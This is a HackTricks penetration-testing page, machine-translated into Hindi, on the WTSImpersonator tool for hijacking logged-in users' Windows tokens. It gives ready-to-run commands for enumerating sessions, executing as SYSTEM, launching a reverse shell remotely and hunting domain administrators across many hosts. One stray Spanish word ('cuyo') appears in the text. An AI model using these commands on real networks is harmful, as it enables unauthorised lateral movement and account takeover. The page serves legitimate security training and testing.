{{#include ../../banners/hacktricks-training.md}}

**WTS Impersonator** उपकरण **"\\pipe\LSM_API_service"** RPC Named pipe का उपयोग करके चुपचाप लॉग इन उपयोगकर्ताओं की सूची बनाता है और उनके टोकन को हाईजैक करता है, पारंपरिक Token Impersonation तकनीकों को बायपास करता है। यह दृष्टिकोण नेटवर्क के भीतर निर्बाध पार्श्व आंदोलनों को सुविधाजनक बनाता है। इस तकनीक के पीछे की नवाचार **Omri Baso** को श्रेय दिया जाता है, cuyo काम [GitHub](https://github.com/OmriBaso/WTSImpersonator) पर उपलब्ध है।

### Core Functionality

उपकरण API कॉल की एक श्रृंखला के माध्यम से कार्य करता है:
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Key Modules and Usage

- **Enumerating Users**: स्थानीय और दूरस्थ उपयोगकर्ता सूचीकरण इस उपकरण के साथ संभव है, किसी भी परिदृश्य के लिए आदेशों का उपयोग करते हुए:

- Locally:
```bash
.\WTSImpersonator.exe -m enum
```
- Remotely, by specifying an IP address or hostname:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Executing Commands**: `exec` और `exec-remote` मॉड्यूल को कार्य करने के लिए एक **Service** संदर्भ की आवश्यकता होती है। स्थानीय निष्पादन के लिए केवल WTSImpersonator निष्पादन योग्य और एक आदेश की आवश्यकता होती है:

- Example for local command execution:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe का उपयोग सेवा संदर्भ प्राप्त करने के लिए किया जा सकता है:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Remote Command Execution**: इसमें PsExec.exe के समान दूरस्थ रूप से एक सेवा बनाना और स्थापित करना शामिल है, जो उचित अनुमतियों के साथ निष्पादन की अनुमति देता है।

- Example of remote execution:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User Hunting Module**: कई मशीनों में विशिष्ट उपयोगकर्ताओं को लक्षित करता है, उनके क्रेडेंशियल के तहत कोड निष्पादित करता है। यह विशेष रूप से कई सिस्टम पर स्थानीय प्रशासनिक अधिकारों के साथ डोमेन प्रशासकों को लक्षित करने के लिए उपयोगी है।
- Usage example:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

{{#include ../../banners/hacktricks-training.md}}
